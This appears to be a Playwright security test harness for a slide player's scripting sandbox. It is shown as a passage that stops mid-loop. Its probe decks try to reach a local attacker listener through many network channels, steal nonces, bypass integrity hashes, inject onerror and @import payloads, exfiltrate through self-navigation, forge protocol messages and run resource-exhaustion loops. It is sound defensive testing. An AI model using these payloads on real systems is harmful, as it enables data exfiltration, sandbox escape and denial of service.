// SPDX-License-Identifier: Apache-2.0
// Interactive mode (ADR-020): adversarial corpus of author scripts against the REAL builder, runtime (with the
// lockdown), CSP and shell, in Chromium, Firefox and WebKit (plus Chromium with site isolation and Firefox with
// Fission). Like the S5 harness, "reached" always means an attacker server logged the request.
//
// Usage: pnpm --filter @pptaken/player test:scripts            (builds first; needs the Playwright browsers)
//        node browser/scripts.mjs --engines=chromium,webkit --only=net,proto
//
// Origins (random ports, loopback only): app http://localhost:A (shell page, CSP like playerCsp with frame-src
// exactly the content origin), content http://127.0.0.1:C (cross-site, the scripted documents), attacker listener
// http://[::1]:L (HTTP and WebSocket), STUN on UDP 127.0.0.1:U and TURN on TCP 127.0.0.1:T. The "same-origin"
// variant serves the documents from the app origin (frame-src 'self'), as a self-hosted instance without
// PPTAKEN_CONTENT_URL does.
//
// Sections:
//   api      the author API works under the lockdown: onEnter/onStep/setSteps, the vendored uPlot draws, keys
//            typed in an input stay there, Escape returns the keyboard, errors reach the shell per slide
//   net      every network channel (fetch, XHR, WebSocket, EventSource, beacon, image, font, worker, import...)
//   nonce    no nonce anywhere: stolen-nonce <script src> impossible
//   integrity external scripts and preloads with integrity="sha256-<allowed hash>" (the ADR-020 finding), by every
//            creation and parsing path known
//   rtc      WebRTC STUN/TURN (with a control page proving the counters see a leak where the engine can)
//   realm    fresh realms and restoring the locked globals
//   nav      self-navigation exfiltration, one technique per load (to the attacker: must fail; to the content
//            origin: measured, a documented residual risk)
//   proto    protocol forgery against the real shell: forged hello/ready/preload/state/keys/select on window,
//            a hijacked MessagePort prototype, synthetic key events, gated keys during a real gesture, key flood
//   inject   script/handler/link/@import injection through slide html and css (sanitized like the server does)
//   tamper   a script edited after hashing does not run; the shell hears an error for that slide
//   static   the static rendering of a scripted deck runs no author code
//   abuse    busy loop, allocation bomb, rAF storm, 10^6 DOM nodes: parent responsiveness, watchdog, plain
//            notice and static fallback (asserted per engine: isolated engines stay responsive; the others show
//            the documented freeze and recover afterwards)
// Results: browser/scripts-last-run.json. Exit code 1 when an assertion fails.

import { createSocket } from "node:dgram";
import { readFileSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { createServer as createTcpServer } from "node:net";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium, firefox, webkit } from "@playwright/test";
import { sanitizeDeck, staticDeck } from "@pptaken/sanitizer";
import { parseDeck } from "@pptaken/schema";
import { buildDeckDocument, contentHeaders, RUNTIME_SHA256 } from "../dist/index.js";

const args = Object.fromEntries(
  process.argv.slice(2).map((a) => {
    const [k, v] = a.replace(/^--/, "").split("=");
    return [k, v ?? "1"];
  }),
);
const ENGINES = (args.engines ?? "chromium,chromium-full,firefox,firefox-fission,webkit").split(
  ",",
);
const ALL = [
  "api",
  "net",
  "nonce",
  "integrity",
  "rtc",
  "realm",
  "nav",
  "proto",
  "inject",
  "tamper",
  "static",
  "abuse",
];
const ONLY = new Set(args.only ? args.only.split(",") : ALL);
const DIST = fileURLToPath(new URL("../dist/", import.meta.url));
const OUT = new URL("./scripts-last-run.json", import.meta.url);

// ---------------------------------------------------------------------------------------------------------------
// Attacker side: HTTP/WS listener, STUN (UDP) and TURN (TCP) counters.

const hits = [];
const listener = createServer((req, res) => {
  hits.push({ path: req.url, at: Date.now() });
  res.writeHead(200, {
    "Content-Type": "text/javascript",
    "Access-Control-Allow-Origin": "*",
    "Cache-Control": "no-store",
  });
  res.end("/*x*/");
});
listener.on("upgrade", (req, socket) => {
  hits.push({ path: `ws:${req.url}`, at: Date.now() });
  socket.destroy();
});
let udp = 0;
const stun = createSocket("udp4");
stun.on("message", () => udp++);
let tcp = 0;
const turn = createTcpServer((s) => {
  tcp++;
  s.destroy();
});

// Content-origin and app-origin "exfiltration" paths (allowed by frame-src: a documented residual).
const ownHits = [];

const listen = (server, host) =>
  new Promise((resolve) => server.listen(0, host, () => resolve(server.address().port)));
const L = await listen(listener, "::1");
await new Promise((r) => stun.bind(0, "127.0.0.1", r));
const U = stun.address().port;
const T = await listen(turn, "127.0.0.1");
const LISTENER = `http://[::1]:${L}`;

// ---------------------------------------------------------------------------------------------------------------
// Decks. Probe scripts use placeholders replaced per load: $L (listener), $TAG (unique tag), $U/$T (STUN/TURN
// ports). They write what they observed into <html data-r>, which the harness reads after the attack.

const R =
  "var out={};function R(k,v){out[k]=v;document.documentElement.setAttribute('data-r',JSON.stringify(out));}\n";
const T_ = (name, body) =>
  `try{${body}}catch(e){R(${JSON.stringify(name)},'threw:'+(e&&e.name))}\n`;

const PROBES = {
  api: {
    libs: ["uplot@1"],
    slides: [
      {
        id: "intro",
        html: '<div id="box"><input id="slider" type="range" min="0" max="100" value="10"><p id="steps">-</p></div>',
        script:
          R +
          "var seen=[];slide.setSteps(3);slide.onEnter(function(s){seen.push('enter'+s);R('seen',seen.join(','));});" +
          "slide.onStep(function(s){seen.push('step'+s);R('seen',seen.join(','));});" +
          "slide.onLeave(function(){seen.push('leave');R('seen',seen.join(','));});" +
          "var c=document.createElement('div');c.style.cssText='width:600px;height:300px';slide.root.appendChild(c);" +
          "var u=new uPlot({width:600,height:300,series:[{},{stroke:'red'}]},[[1,2,3,4],[1,3,2,4]],c);" +
          "R('uplot',typeof uPlot);R('canvas',c.querySelectorAll('canvas').length);" +
          "document.getElementById('slider').addEventListener('input',function(e){R('slider',e.target.value);});",
      },
      {
        id: "boom",
        html: "<p>boom</p>",
        script: "slide.onEnter(function(){ throw new Error('x'); });",
      },
      { id: "broken", html: "<p>broken</p>", script: "this is not javascript (" },
      { id: "end", html: "<p>end</p>" },
    ],
  },
  net: {
    slides: [
      {
        id: "n",
        html: "<p>net</p>",
        script:
          R +
          "var H='$L/hit/$TAG-';" +
          T_("fetch", "R('fetch',typeof fetch);fetch(H+'fetch');") +
          T_(
            "xhr",
            "R('xhr',typeof XMLHttpRequest);var x=new XMLHttpRequest();x.open('GET',H+'xhr');x.send();",
          ) +
          T_("ws", "R('ws',typeof WebSocket);new WebSocket('ws://[::1]:$PORT/hit/$TAG-ws');") +
          T_("es", "R('es',typeof EventSource);new EventSource(H+'es');") +
          T_(
            "beacon",
            "R('beacon',typeof navigator.sendBeacon);navigator.sendBeacon(H+'beacon','x');",
          ) +
          T_("img", "var i=new Image();i.src=H+'img';R('img','set');") +
          T_(
            "font",
            "var f=new FontFace('x','url('+H+'font)');f.load().catch(function(){});R('font','set');",
          ) +
          T_("css", "slide.root.style.backgroundImage='url('+H+'css)';R('css','set');") +
          T_("worker", "R('worker',typeof Worker);new Worker(H+'worker');") +
          T_("shared", "R('shared',typeof SharedWorker);new SharedWorker(H+'shared');") +
          T_(
            "import",
            "import(H+'import.js').then(function(){R('import','loaded')},function(){R('import','rejected')});",
          ) +
          T_(
            "wt",
            "R('wt',typeof WebTransport);new WebTransport('https://[::1]:$PORT/hit/$TAG-wt');",
          ) +
          T_("bc", "R('bc',typeof BroadcastChannel);") +
          T_("open", "R('open',typeof window.open);window.open(H+'open');") +
          T_("conn", "R('conn',typeof navigator.connection);") +
          T_("eval", "R('eval',String(eval('1+1')));") +
          T_("fn", "R('fn',String(new Function('return 2')()));"),
      },
    ],
  },
  nonce: {
    slides: [
      {
        id: "n",
        html: "<p>nonce</p>",
        script:
          R +
          "var ns=[];for(var i=0;i<document.scripts.length;i++){ns.push(document.scripts[i].nonce||'');}R('nonces',ns.join('|'));" +
          T_(
            "steal",
            "var s=document.createElement('script');s.nonce=ns[0];s.src='$L/hit/$TAG-nonce';document.head.appendChild(s);R('steal','appended');",
          ),
      },
    ],
  },
  integrity: {
    slides: [
      {
        id: "n",
        html: "<p>integrity</p>",
        script:
          R +
          "var H='$L/hit/$TAG-';var hash=null;" +
          // Learn the allowed hashes from a CSP violation report (the policy is not secret).
          "document.addEventListener('securitypolicyviolation',function(e){if(hash)return;var m=/'(sha256-[^']+)'/.exec(e.originalPolicy||'');hash=m&&m[1];R('learned',!!hash);run();});" +
          "var im=new Image();im.src=H+'trigger';" +
          "setTimeout(function(){if(!hash){hash='sha256-'+'A'.repeat(43)+'=';R('learned',false);run();}},1500);" +
          "function run(){var I=' integrity=\"'+hash+'\"';var tag='scr'+'ipt';" +
          T_(
            "create",
            "var s=document.createElement(tag);s.src=H+'create';s.integrity=hash;document.body.appendChild(s);R('create','appended');",
          ) +
          T_(
            "createNS",
            "var s=document.createElementNS('http://www.w3.org/2000/svg',tag);s.setAttribute('href',H+'createNS');document.body.appendChild(s);R('createNS','appended');",
          ) +
          T_(
            "clone",
            "var c=document.scripts[0].cloneNode(true);c.setAttribute('src',H+'clone');c.setAttribute('integrity',hash);document.body.appendChild(c);R('clone','appended');",
          ) +
          T_(
            "frag",
            "document.body.appendChild(document.createRange().createContextualFragment('<'+tag+' src=\"'+H+'frag\"'+I+'></'+tag+'>'));R('frag','appended');",
          ) +
          T_(
            "link",
            "var l=document.createElement('link');l.rel='preload';l.as='script';l.href=H+'link';l.integrity=hash;document.head.appendChild(l);R('link','appended');",
          ) +
          T_(
            "modlink",
            "var l=document.createElement('link');l.rel='modulepreload';l.href=H+'modlink';l.integrity=hash;document.head.appendChild(l);R('modlink','appended');",
          ) +
          T_(
            "inner",
            "var d=document.createElement('div');d.innerHTML='<link rel=\"preload\" as=\"script\" href=\"'+H+'inner\"'+I+'>';document.body.appendChild(d);R('inner','appended');",
          ) +
          T_(
            "outer",
            "var d=document.createElement('div');document.body.appendChild(d);d.outerHTML='<link rel=\"modulepreload\" href=\"'+H+'outer\"'+I+'>';R('outer','set');",
          ) +
          T_(
            "adjacent",
            "document.body.insertAdjacentHTML('beforeend','<link rel=\"preload\" as=\"script\" href=\"'+H+'adjacent\"'+I+'>');R('adjacent','set');",
          ) +
          T_(
            "parser",
            "var p=new DOMParser().parseFromString('<link rel=\"preload\" as=\"script\" href=\"'+H+'parser\"'+I+'>','text/html');document.head.appendChild(document.importNode(p.querySelector('link'),true));R('parser','appended');",
          ) +
          T_(
            "implementation",
            "var d2=document.implementation.createHTMLDocument('x');var l=d2.createElement('link');l.rel='preload';l.as='script';l.href=H+'impl';l.integrity=hash;document.head.appendChild(document.adoptNode(l));R('implementation','appended');",
          ) +
          T_(
            "template",
            "var t=document.createElement('template');t.innerHTML='<link rel=\"preload\" as=\"script\" href=\"'+H+'template\"'+I+'>';document.head.appendChild(t.content);R('template','appended');",
          ) +
          T_(
            "unsafe",
            "if(document.body.setHTMLUnsafe){var d=document.createElement('div');d.setHTMLUnsafe('<'+tag+' src=\"'+H+'unsafe\"'+I+'></'+tag+'>');document.body.appendChild(d);R('unsafe','appended');}else R('unsafe','absent');",
          ) +
          T_(
            "write",
            "R('write',typeof document.write);document.write('<'+tag+' src=\"'+H+'write\"'+I+'></'+tag+'>');",
          ) +
          T_("exec", "R('exec',typeof document.execCommand);") +
          T_("xslt", "R('xslt',typeof XSLTProcessor);") +
          T_("ce", "R('ce',typeof customElements);") +
          T_(
            "restore",
            "R('restore',String(delete Document.prototype.createElement)+'/'+(Object.getOwnPropertyDescriptor(Document.prototype,'createElement')||{}).configurable);",
          ) +
          T_(
            "ttdup",
            "R('ttdup',String(!!(window.trustedTypes&&trustedTypes.createPolicy('default',{createScriptURL:function(s){return s}}))));",
          ) +
          T_(
            "ttpolicy",
            "if(window.trustedTypes){var p=trustedTypes.createPolicy('x',{createScriptURL:function(s){return s}});R('ttpolicy','created');}else R('ttpolicy','absent');",
          ) +
          "R('done',1);}",
      },
    ],
  },
  rtc: {
    slides: [
      {
        id: "n",
        html: "<p>rtc</p>",
        script:
          R +
          "var names=['RTCPeerConnection','webkitRTCPeerConnection','mozRTCPeerConnection'];" +
          "names.forEach(function(n){R(n,typeof window[n]);});" +
          "var desc=Object.getOwnPropertyDescriptor(window,'RTCPeerConnection');R('configurable',desc?String(desc.configurable):'none');" +
          T_(
            "pc",
            "var P=window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection;var pc=new P({iceServers:[{urls:'stun:127.0.0.1:$U'},{urls:'turn:127.0.0.1:$T?transport=tcp',username:'u',credential:'c'}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});R('pc','created');",
          ) +
          T_(
            "restore",
            "delete window.RTCPeerConnection;window.RTCPeerConnection=1;R('restore',typeof window.RTCPeerConnection);",
          ) +
          T_(
            "proto",
            "var k=Object.getOwnPropertyNames(Object.getPrototypeOf(window)).filter(function(n){return /RTC/.test(n)});R('proto',k.join(','));",
          ) +
          T_("devices", "R('devices',typeof navigator.mediaDevices);"),
      },
    ],
  },
  realm: {
    slides: [
      {
        id: "n",
        html: "<p>realm</p>",
        script:
          R +
          T_(
            "iframe",
            "var f=document.createElement('iframe');document.body.appendChild(f);R('iframe','created:'+typeof f.contentWindow.fetch);",
          ) +
          T_(
            "iframeHtml",
            "var d=document.createElement('div');d.innerHTML='<ifr'+'ame></ifr'+'ame>';document.body.appendChild(d);R('iframeHtml','created');",
          ) +
          T_("open", "R('open',typeof window.open);") +
          T_("docopen", "R('docopen',typeof document.open);") +
          T_("fetchWrite", "window.fetch=function(){};R('fetchWrite',typeof window.fetch);") +
          T_(
            "fetchDefine",
            "Object.defineProperty(window,'fetch',{value:1});R('fetchDefine','defined');",
          ) +
          T_("fetchDelete", "R('fetchDelete',String(delete window.fetch)+'/'+typeof fetch);") +
          T_("frames", "R('frames',String(window.frames.length));") +
          T_(
            "newDoc",
            "var d=new Document();var l=d.createElement('link');R('newDoc','created');",
          ) +
          T_(
            "navProto",
            "R('navProto',typeof Navigator.prototype.sendBeacon+'/'+typeof navigator.sendBeacon);",
          ) +
          T_(
            "ttScriptUrl",
            "var s=document.scripts[0].cloneNode();s.src='$L/hit/$TAG-realm';R('ttScriptUrl','set');",
          ),
      },
    ],
  },
  inject: {
    raw: true,
    slides: [
      {
        id: "n",
        html:
          "<p>inject</p><script>top.x=1</script><img src=x onerror=\"fetch('$L/hit/$TAG-onerror')\">" +
          '<a href="$L/hit/$TAG-a">a</a><button type="button" onclick="x()">b</button>' +
          '<div style="background:url($L/hit/$TAG-style)">s</div><svg><a href="$L/hit/$TAG-svga"><text>t</text></a></svg>' +
          '<meta http-equiv="refresh" content="0;url=$L/hit/$TAG-meta"><form action="$L/hit/$TAG-form"><input type="text"></form>',
        css: "@import url($L/hit/$TAG-import);p{background:url($L/hit/$TAG-cssurl)}",
        script:
          R +
          "R('ran',1);R('inputs',slide.root.querySelectorAll('input,form,a,meta,script,iframe').length);",
      },
    ],
  },
  tamper: {
    slides: [
      { id: "intro", html: "<p>intro</p>" },
      { id: "t", html: "<p>tampered</p>", script: R + "R('ran','/*TAMPER*/');" },
    ],
  },
  static: {
    slides: [
      {
        id: "n",
        html: "<p>static</p><canvas></canvas>",
        script: R + "R('ran',1);fetch('$L/hit/$TAG-static');",
      },
    ],
  },
  proto: {
    slides: [
      {
        id: "p0",
        html: "<p>forgery</p>",
        // Closes the wrapper to run at parse time, before the runtime's ready (but after its hello).
        script:
          "});\n" +
          "var P=parent;function F(m,ports){try{P.postMessage(m,'*',ports||[]);}catch(e){}}" +
          "var ch=new MessageChannel();F({v:1,type:'hello'},[ch.port2]);" +
          "F({v:1,type:'ready',slides:Array.from({length:200},function(_,i){return{id:'f'+i,steps:0}}),width:1920,height:1080});" +
          "F({v:1,type:'preload',ok:true,images:9999,fonts:9,failed:[]});" +
          "F({v:1,type:'state',slide:150,step:0});F({v:1,type:'select',slide:3});" +
          "['KeyS','KeyO','KeyP','KeyR','KeyK','Enter','KeyF','Question','ArrowRight','ArrowRight','KeyB'].forEach(function(k){F({v:1,type:'key',code:k});});" +
          // Hijack attempt: the runtime's port messages go through a poisoned prototype method.
          "var orig=MessagePort.prototype.postMessage;MessagePort.prototype.postMessage=function(m){try{orig.call(this,{v:1,type:'key',code:'KeyS'});orig.call(this,{v:1,type:'key',code:'KeyO'});orig.call(this,{v:1,type:'state',slide:150,step:0});}catch(e){}return orig.apply(this,arguments);};" +
          "(function(){\n",
      },
      {
        id: "p1",
        html: '<p>gesture</p><input id="r" type="range" min="0" max="10" value="5">',
        script:
          // During real clicks and keys: forged gated keys on window, and synthetic key events inside the frame.
          "document.addEventListener('click',function(){parent.postMessage({v:1,type:'key',code:'KeyS'},'*');parent.postMessage({v:1,type:'key',code:'KeyO'},'*');parent.postMessage({v:1,type:'key',code:'Enter'},'*');" +
          "['s','o','p','r','k','Enter','f','?','ArrowRight'].forEach(function(k){window.dispatchEvent(new KeyboardEvent('keydown',{key:k,bubbles:true}));});},true);" +
          "slide.setSteps(60);",
      },
      { id: "p2", html: "<p>two</p>" },
      { id: "p3", html: "<p>three</p>" },
    ],
  },
};

// Self-navigation techniques, each in its own load (navigation ends the document).
const NAV = {
  assign: "location.assign('$TARGET');",
  replace: "location.replace('$TARGET');",
  href: "location.href='$TARGET';",
  anchor:
    "var a=document.createElement('a');a.href='$TARGET';document.body.appendChild(a);a.click();",
  anchorTop:
    "var a=document.createElement('a');a.href='$TARGET';a.target='_top';document.body.appendChild(a);a.click();",
  meta: "var m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url=$TARGET';document.head.appendChild(m);",
  metaHtml:
    "document.head.insertAdjacentHTML('beforeend','<meta http-equiv=\"refresh\" content=\"0;url=$TARGET\">');",
  navigation: "navigation.navigate('$TARGET');",
  topLocation: "top.location='$TARGET';",
  open: "window.open('$TARGET');",
  form: "var f=document.createElement('form');f.action='$TARGET';document.body.appendChild(f);f.submit();",
};

const ABUSE = {
  busy: "setTimeout(function(){var e=Date.now()+8000;while(Date.now()<e){}},800);",
  alloc:
    "setTimeout(function(){var keep=[];try{for(var i=0;i<16;i++){var a=new Uint8Array(64*1024*1024);a.fill(i);keep.push(a);}}catch(e){}window.__keep=keep;},800);",
  raf: "setTimeout(function(){var end=Date.now()+6000;function f(){var t=Date.now()+45;while(Date.now()<t){}if(Date.now()<end)requestAnimationFrame(f);}requestAnimationFrame(f);},800);",
  dom: "setTimeout(function(){var root=document.createElement('div');for(var i=0;i<1000000;i++){root.appendChild(document.createElement('i'));}slide.root.appendChild(root);},800);",
};

function deckFor(slides, libs) {
  const r = parseDeck({ schemaVersion: 1, title: "Probe", ...(libs ? { libs } : {}), slides });
  if (!r.ok) throw new Error(`bad probe deck: ${JSON.stringify(r.issues)}`);
  // Exactly what the server stores: sanitized with the interactive profile.
  return sanitizeDeck(r.deck, { profile: "interactive" }).deck;
}

function fill(text, vars) {
  let out = text;
  for (const [k, v] of Object.entries(vars)) out = out.split(k).join(v);
  return out;
}

/** The deck of a request: probe name, tag and optional nav/abuse technique. */
function deckOfRequest(probe, tag, extra, contentOrigin) {
  const vars = { $L: LISTENER, $TAG: tag, $U: String(U), $T: String(T), $PORT: String(L) };
  if (probe === "nav") {
    const target = extra.startsWith("own-")
      ? `${contentOrigin}/x-exfil/${tag}?secret=1`
      : `${LISTENER}/hit/${tag}-${extra}`;
    const script = fill(
      `setTimeout(function(){try{${NAV[extra.replace(/^own-/, "")]}}catch(e){}},300);`,
      {
        $TARGET: target,
        ...vars,
      },
    );
    return deckFor([{ id: "n", html: "<p>nav</p>", script }]);
  }
  if (probe === "abuse") {
    return deckFor([
      { id: "a", html: "<p>abuse</p>", script: ABUSE[extra] },
      { id: "b", html: "<p>b</p>" },
    ]);
  }
  const p = PROBES[probe];
  const slides = p.slides.map((s) => {
    const out = { ...s, html: fill(s.html, vars) };
    if (s.css) out.css = fill(s.css, vars);
    if (s.script) out.script = fill(s.script, vars);
    return out;
  });
  return deckFor(slides, p.libs);
}

// ---------------------------------------------------------------------------------------------------------------
// App and content servers.

const PAGE_JS = `import { createPlayer } from "/_player/shell.js";
const body = document.body;
const cfg = JSON.parse(body.dataset.cfg);
const log = (window.__log = { keys: [], positions: [], opens: 0, faults: [], errors: [], offline: [], ready: null, gap: 0, mode: [] });
window.open = () => { log.opens++; return null; };
let last = performance.now();
setInterval(() => { const now = performance.now(); log.gap = Math.max(log.gap, now - last); last = now; }, 20);
document.addEventListener("keydown", (e) => { log.pageKeys = (log.pageKeys || 0) + 1; }, true);
const player = createPlayer(document.getElementById("stage"), {
  contentUrl: cfg.url,
  scripts: cfg.scripts,
  expect: cfg.expect,
  hash: false,
  loadTimeoutMs: 0,
  presenterUrl: "/presenter-dummy",
  ...(cfg.fallback ? { fallbackUrl: async () => cfg.fallback } : {}),
  onKey: (code, source) => { log.keys.push(source + ":" + code); return false; },
  onReady: (s) => { log.ready = s.length; },
  onChange: (s) => { log.positions.push([Math.round(performance.now()), s.slide, s.step, s.mode]); },
  onFault: (f) => { log.faults.push([Math.round(performance.now()), f]); },
  onScriptError: (n) => { log.errors.push(n); },
  onOffline: (o) => { log.offline.push(o.state); },
});
window.__player = player;
log.notice = [];
new MutationObserver(() => {
  const on = !!document.querySelector("[data-pptaken-notice]");
  if (log.notice.length === 0 || log.notice.at(-1)[1] !== on) log.notice.push([Math.round(performance.now()), on]);
}).observe(document.getElementById("stage"), { childList: true });
`;

function shellHtml(cfg, frameSrc) {
  return {
    html: `<!doctype html><html><head><meta charset="utf-8"><title>shell</title><style>html,body{margin:0;height:100%;background:#000}#stage{position:fixed;inset:0}</style></head><body data-cfg="${JSON.stringify(cfg).replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"><div id="stage"></div><script type="module" src="/page.js"></script></body></html>`,
    csp: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src ${frameSrc}; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`,
  };
}

function serveDoc(req, res, origin, appOrigin) {
  const url = new URL(req.url, origin);
  const [, , , probe] = url.pathname.split("/"); // /c/doc/<probe>
  const tag = url.searchParams.get("tag") ?? "x";
  const extra = url.searchParams.get("x") ?? "";
  const mode = url.searchParams.get("mode") ?? "scripted";
  const deck = deckOfRequest(probe, tag, extra, origin);
  const assetBaseUrl = `${origin}/c/asset/`;
  const frameAncestors = [appOrigin];
  let html;
  let headers;
  if (mode === "static") {
    const nonce = "q1w2e3r4t5y6u7i8o9p0aA==";
    html = buildDeckDocument(staticDeck(deck).deck, { nonce, assetBaseUrl }).html;
    headers = contentHeaders({ nonce, assetBaseUrl, frameAncestors });
  } else {
    const built = buildDeckDocument(deck, { scripts: true, assetBaseUrl, frameAncestors });
    html = built.html;
    if (probe === "tamper") html = html.replace("/*TAMPER*/", "/*EDITED*/");
    headers = {
      ...contentHeaders({ scriptHashes: [RUNTIME_SHA256], assetBaseUrl, frameAncestors }),
      "Content-Security-Policy": built.csp,
    };
  }
  res.writeHead(200, headers);
  res.end(html);
}

function makeServer(kind) {
  return createServer((req, res) => {
    const origin = kind === "app" ? APP : CONTENT;
    const url = new URL(req.url, origin);
    const path = url.pathname;
    if (path.startsWith("/x-exfil/")) {
      ownHits.push({ kind, path, cookie: req.headers.cookie ?? "", at: Date.now() });
      res.writeHead(404, { "Content-Type": "text/plain" });
      res.end("no");
      return;
    }
    if (path.startsWith("/c/doc/")) return serveDoc(req, res, origin, APP);
    if (path.startsWith("/c/asset/")) {
      res.writeHead(404);
      res.end();
      return;
    }
    if (kind === "app") {
      if (path === "/page.js") {
        res.writeHead(200, { "Content-Type": "text/javascript" });
        res.end(PAGE_JS);
        return;
      }
      if (path.startsWith("/_player/")) {
        try {
          const body = readFileSync(
            join(DIST, path.slice("/_player/".length).replace(/[^a-z0-9.-]/gi, "")),
          );
          res.writeHead(200, { "Content-Type": "text/javascript" });
          res.end(body);
        } catch {
          res.writeHead(404);
          res.end();
        }
        return;
      }
      if (path === "/shell") {
        const cfg = JSON.parse(url.searchParams.get("cfg") ?? "{}");
        const { html, csp } = shellHtml(cfg, cfg.frameSrc);
        res.writeHead(200, {
          "Content-Type": "text/html; charset=utf-8",
          "Content-Security-Policy": csp,
          "Set-Cookie": "sess=owner; Path=/; SameSite=Lax; HttpOnly",
          "X-Frame-Options": "DENY",
        });
        res.end(html);
        return;
      }
      if (path === "/control-rtc") {
        res.writeHead(200, { "Content-Type": "text/html" });
        res.end(
          `<!doctype html><script>try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${U}'},{urls:'turn:127.0.0.1:${T}?transport=tcp',username:'u',credential:'c'}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});document.title='created'}catch(e){document.title='threw'}</script>`,
        );
        return;
      }
    }
    res.writeHead(404);
    res.end();
  });
}

const appServer = makeServer("app");
const contentServer = makeServer("content");
const A = await listen(appServer, "127.0.0.1");
const C = await listen(contentServer, "127.0.0.1");
const APP = `http://localhost:${A}`;
const CONTENT = `http://127.0.0.1:${C}`;

// ---------------------------------------------------------------------------------------------------------------
// Engines and helpers.

const BROWSERS = {
  chromium,
  "chromium-full": chromium,
  firefox,
  "firefox-fission": firefox,
  webkit,
};
const LAUNCH = {
  "chromium-full": { channel: "chromium" },
  firefox: { firefoxUserPrefs: { "media.peerconnection.ice.loopback": true } },
  "firefox-fission": {
    firefoxUserPrefs: { "fission.autostart": true, "media.peerconnection.ice.loopback": true },
  },
};

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let seq = 0;

function shellUrl(
  probe,
  { variant = "cross", mode = "scripted", extra = "", fallback = false } = {},
) {
  const tag = `${probe}${extra ? `.${extra}` : ""}.${variant}.${++seq}`;
  const origin = variant === "same" ? APP : CONTENT;
  const q = `tag=${encodeURIComponent(tag)}&x=${encodeURIComponent(extra)}`;
  const deck = deckOfRequest(probe, tag, extra, origin);
  const cfg = {
    url: `${origin}/c/doc/${probe}?${q}&mode=${mode}`,
    scripts: mode === "scripted",
    expect: { slides: deck.slides.map((s) => s.id), width: 1920, height: 1080 },
    frameSrc: variant === "same" ? "'self'" : CONTENT,
    ...(fallback ? { fallback: `${origin}/c/doc/${probe}?${q}&mode=static` } : {}),
  };
  return { url: `${APP}/shell?cfg=${encodeURIComponent(JSON.stringify(cfg))}`, tag };
}

const hitsFor = (tag) => hits.filter((h) => h.path.includes(`/hit/${tag}-`)).map((h) => h.path);
const contentFrame = (page) => page.frames().find((f) => f.url().includes("/c/doc/"));

async function openShell(page, probe, opts) {
  const { url, tag } = shellUrl(probe, opts);
  await page.goto(url);
  await page.waitForFunction(
    () => window.__log?.ready !== null || window.__log?.faults.length > 0,
    null,
    {
      timeout: 15_000,
    },
  );
  return tag;
}

async function frameResult(page) {
  const frame = contentFrame(page);
  if (!frame) return null;
  try {
    const r = await frame.evaluate(() => document.documentElement.getAttribute("data-r"));
    return r ? JSON.parse(r) : null;
  } catch {
    return null;
  }
}

// ---------------------------------------------------------------------------------------------------------------
// Run.

const report = {
  date: new Date().toISOString(),
  origins: { app: APP, content: CONTENT, listener: LISTENER, stun: U, turn: T },
  engines: {},
};
let failures = 0;

for (const name of ENGINES) {
  const type = BROWSERS[name];
  if (!type) continue;
  let browser;
  try {
    browser = await type.launch(LAUNCH[name] ?? {});
  } catch (error) {
    report.engines[name] = { skipped: String(error).split("\n")[0] };
    console.log(`${name}: skipped (${String(error).split("\n")[0]})`);
    continue;
  }
  const engine = { version: browser.version(), checks: [], measurements: {} };
  report.engines[name] = engine;
  const check = (id, ok, detail = {}) => {
    engine.checks.push({ id, ok, ...detail });
    if (!ok) {
      failures++;
      console.log(`  FAIL ${name} ${id} ${JSON.stringify(detail)}`);
    }
  };
  const newPage = async () => {
    const context = await browser.newContext({ viewport: { width: 1280, height: 720 } });
    return { context, page: await context.newPage() };
  };
  console.log(`${name} ${engine.version}`);

  // ------------------------------------------------------------------------------------------------- api
  if (ONLY.has("api")) {
    const { context, page } = await newPage();
    const tag = await openShell(page, "api");
    await sleep(800);
    const log = await page.evaluate(() => window.__log);
    const r = await frameResult(page);
    check("api.ready-matches-expect", log.ready === 4 && log.faults.length === 0, {
      log: log.faults,
    });
    check("api.uplot-draws-under-lockdown", r?.uplot === "function" && r?.canvas >= 1, { r });
    check("api.onEnter-called", (r?.seen ?? "").startsWith("enter0"), { seen: r?.seen });
    check("api.broken-and-throwing-scripts-reported", log.errors.includes(2), {
      errors: log.errors,
    });
    // Keys typed in a control stay there; the shell does not move.
    await contentFrame(page).locator("#slider").focus();
    await page.keyboard.press("ArrowRight");
    await sleep(300);
    const afterSlider = await page.evaluate(() => window.__log.positions.at(-1));
    const r2 = await frameResult(page);
    check(
      "api.input-keeps-its-keys",
      r2?.slider === "11" && afterSlider[1] === 0 && afterSlider[2] === 0,
      {
        slider: r2?.slider,
        afterSlider,
      },
    );
    // Escape gives the keyboard back to the page; then the page's keys navigate (steps declared by setSteps).
    await page.keyboard.press("Escape");
    await sleep(200);
    const pageKeysBefore = (await page.evaluate(() => window.__log.pageKeys)) ?? 0;
    await page.keyboard.press("ArrowRight");
    await sleep(300);
    const log2 = await page.evaluate(() => window.__log);
    check("api.escape-returns-keyboard", (log2.pageKeys ?? 0) > pageKeysBefore, {
      before: pageKeysBefore,
      after: log2.pageKeys,
    });
    const r3 = await frameResult(page);
    check(
      "api.onStep-and-setSteps",
      log2.positions.at(-1)[2] === 1 && /step1/.test(r3?.seen ?? ""),
      {
        last: log2.positions.at(-1),
        seen: r3?.seen,
      },
    );
    // Leaving the slide calls onLeave; entering a throwing slide is reported (slide 1).
    await page.evaluate(() => window.__player.goto(1, 0));
    await sleep(500);
    const log3 = await page.evaluate(() => window.__log);
    check("api.callback-errors-reported", log3.errors.includes(1), { errors: log3.errors });
    check("api.no-listener-hits", hitsFor(tag).length === 0, { hits: hitsFor(tag) });
    await context.close();
  }

  // ------------------------------------------------------------------------------------------------- net, nonce, integrity, rtc, realm, inject, static
  for (const probe of ["net", "nonce", "integrity", "rtc", "realm", "inject", "static", "tamper"]) {
    if (!ONLY.has(probe)) continue;
